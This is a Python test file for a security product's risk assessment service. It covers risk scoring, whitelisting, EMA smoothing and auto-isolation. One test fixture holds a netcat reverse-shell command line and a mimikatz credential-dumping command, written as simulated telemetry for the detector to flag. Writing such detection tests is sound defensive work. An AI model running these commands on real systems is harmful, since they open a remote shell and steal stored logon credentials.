import pytest
from unittest.mock import AsyncMock, MagicMock, patch
from app.services.detection.risk_assessment_service import RiskAssessmentService
from app.schemas.risk import RiskAssessmentDTO

pytestmark = pytest.mark.asyncio


async def test_evaluate_low_risk(mock_db, mock_notification_service):
    service = RiskAssessmentService(mock_db)
    service.risk_repo = MagicMock()
    service.risk_repo.add = AsyncMock()
    service.whitelist_service = MagicMock()
    service.whitelist_service.is_whitelisted = AsyncMock(return_value=False)
    service.threat_intel_service = MagicMock()
    service.threat_intel_service.check_hash = AsyncMock(return_value={"is_malicious": False})
    service.threat_intel_service.check_ip = AsyncMock(return_value={"is_malicious": False})
    service.setting_service = MagicMock()
    service.setting_service.get_risk_thresholds = AsyncMock(return_value={"log": 30.0, "alert": 30.0, "alert_with_buttons": 60.0, "auto_isolate": 80.0})

    dto = RiskAssessmentDTO(
        agent_id="agent-1",
        cpu_usage=10.0,
        process_list=[],
        network_connections=[]
    )

    score, factors = await service.evaluate(dto.agent_id, dto)
    assert 0 <= score <= 100
    assert score == 0.0


async def test_process_risk_high_risk_auto_isolate(mock_db, mock_notification_service):
    service = RiskAssessmentService(mock_db)
    service.risk_repo = MagicMock()
    service.risk_repo.add = AsyncMock()
    service.agent_repo = MagicMock()
    service.agent_repo.get = AsyncMock(return_value=MagicMock(hostname="agent-1", isolate=MagicMock()))

    service.whitelist_service = MagicMock()
    service.whitelist_service.is_whitelisted = AsyncMock(return_value=False)

    service.threat_intel_service = MagicMock()
    service.threat_intel_service.check_hash = AsyncMock(return_value={"is_malicious": True})
    service.threat_intel_service.check_ip = AsyncMock(return_value={"is_malicious": True})

    service.setting_service = MagicMock()
    service.setting_service.get_risk_thresholds = AsyncMock(return_value={"log": 30.0, "alert": 30.0, "alert_with_buttons": 60.0, "auto_isolate": 80.0})

    service.notification_service = mock_notification_service

    mock_dispatcher = MagicMock()
    mock_dispatcher.push_command = AsyncMock()

    mock_cmd_repo = MagicMock()
    mock_cmd_repo.add = AsyncMock()

    with patch("app.services.detection.risk_assessment_service.command_dispatcher", mock_dispatcher), \
         patch("app.services.detection.risk_assessment_service.CommandRepository", return_value=mock_cmd_repo), \
         patch("app.services.detection.risk_assessment_service.IncidentService") as MockIncService:

        mock_inc_instance = MagicMock()
        mock_inc_instance.create_from_risk = AsyncMock(return_value=MagicMock(id="inc-123"))
        MockIncService.return_value = mock_inc_instance

        dto = RiskAssessmentDTO(
            agent_id="agent-1",
            cpu_usage=95.0,
            process_list=[{"name": "mimikatz.exe", "is_suspicious": True, "hash": "badhash"}],
            network_connections=[{"dst_port": 4444, "dst_ip": "1.2.3.4"}]
        )

        record = await service.process_risk(dto.agent_id, dto)
        assert record.score >= 80.0

        mock_dispatcher.push_command.assert_awaited_once()
        call_args = mock_dispatcher.push_command.call_args[0]
        assert call_args[1] == "agent-1"


async def test_whitelisted_agent_no_auto_isolate(mock_db, mock_notification_service):
    service = RiskAssessmentService(mock_db)
    service.risk_repo = MagicMock()
    service.risk_repo.add = AsyncMock()
    service.agent_repo = MagicMock()
    service.agent_repo.get = AsyncMock(return_value=MagicMock(hostname="agent-1"))

    service.whitelist_service = MagicMock()
    service.whitelist_service.is_whitelisted = AsyncMock(return_value=True)

    service.threat_intel_service = MagicMock()
    service.threat_intel_service.check_hash = AsyncMock(return_value={"is_malicious": False})
    service.threat_intel_service.check_ip = AsyncMock(return_value={"is_malicious": False})

    service.setting_service = MagicMock()
    service.setting_service.get_risk_thresholds = AsyncMock(return_value={"log": 30.0, "alert": 30.0, "alert_with_buttons": 60.0, "auto_isolate": 80.0})

    service.notification_service = mock_notification_service

    mock_dispatcher = MagicMock()
    mock_dispatcher.push_command = AsyncMock()

    with patch("app.services.detection.risk_assessment_service.command_dispatcher", mock_dispatcher):
        dto = RiskAssessmentDTO(
            agent_id="agent-1",
            cpu_usage=95.0,
            process_list=[{"name": "excel.exe", "is_suspicious": False}],
            network_connections=[]
        )

        await service.process_risk(dto.agent_id, dto)
        mock_dispatcher.push_command.assert_not_awaited()


async def test_compute_ema_critical_bypass():
    from app.services.detection.risk_assessment_service import compute_ema, CRITICAL_BYPASS_THRESHOLD

    # When current score >= CRITICAL_BYPASS_THRESHOLD (e.g. 100), bypass EMA even if previous was 0.0
    assert compute_ema(100.0, 0.0) == 100.0
    assert compute_ema(85.0, 0.0) == 85.0

    # When current score < CRITICAL_BYPASS_THRESHOLD, normal EMA applies: 0.35 * current + 0.65 * previous
    assert compute_ema(40.0, 0.0) == 14.0
    assert compute_ema(50.0, 10.0) == 24.0


async def test_process_risk_critical_attack_bypasses_ema(mock_db, mock_notification_service):
    """Verify that an attack score of 100 bypasses EMA (does not get dampened to 35) and creates an incident."""
    service = RiskAssessmentService(mock_db)
    service.risk_repo = MagicMock()
    service.risk_repo.add = AsyncMock()
    
    # Previous smoothed score is 0.0 (normal state)
    prev_record = MagicMock(score=0.0, smoothed_score=0.0)
    service.risk_repo.get_latest_by_agent = AsyncMock(return_value=[prev_record])

    service.agent_repo = MagicMock()
    service.agent_repo.get = AsyncMock(return_value=MagicMock(hostname="agent-victim", isolate=MagicMock()))

    service.whitelist_service = MagicMock()
    service.whitelist_service.is_whitelisted = AsyncMock(return_value=False)

    service.threat_intel_service = MagicMock()
    service.threat_intel_service.check_hash = AsyncMock(return_value={"is_malicious": True})
    service.threat_intel_service.check_ip = AsyncMock(return_value={"is_malicious": True})

    service.setting_service = MagicMock()
    service.setting_service.get_risk_thresholds = AsyncMock(return_value={
        "log": 30.0, "alert": 30.0, "alert_with_buttons": 60.0, "auto_isolate": 80.0,
        "incident_creation_threshold": 50.0, "auto_kill_threshold": 85.0
    })

    service.notification_service = mock_notification_service

    mock_dispatcher = MagicMock()
    mock_dispatcher.push_command = AsyncMock()

    mock_cmd_repo = MagicMock()
    mock_cmd_repo.add = AsyncMock()

    with patch("app.services.detection.risk_assessment_service.command_dispatcher", mock_dispatcher), \
         patch("app.services.detection.risk_assessment_service.CommandRepository", return_value=mock_cmd_repo), \
         patch("app.services.detection.risk_assessment_service.IncidentService") as MockIncService:

        mock_inc_instance = MagicMock()
        mock_inc_instance.create_from_risk = AsyncMock(return_value=MagicMock(id="inc-critical"))
        MockIncService.return_value = mock_inc_instance

        # Critical attack payload (e.g. reverse shell / mimikatz)
        dto = RiskAssessmentDTO(
            agent_id="agent-victim",
            cpu_usage=99.0,
            process_list=[
                {"name": "nc.exe", "cmdline": "nc.exe -e cmd.exe 192.168.30.104 4444", "is_suspicious": True},
                {"name": "mimikatz.exe", "cmdline": "mimikatz.exe sekurlsa::logonpasswords", "is_suspicious": True}
            ],
            network_connections=[{"dst_port": 4444, "dst_ip": "192.168.30.104"}]
        )

        record = await service.process_risk(dto.agent_id, dto)

        # Raw score >= 85
        assert record.score >= 85.0
        # Smoothed score must NOT be dampened to ~30-35; it must equal raw score!
        assert record.smoothed_score == record.score
        assert record.smoothed_score >= 85.0

        # Incident must be created immediately!
        mock_inc_instance.create_from_risk.assert_awaited_once()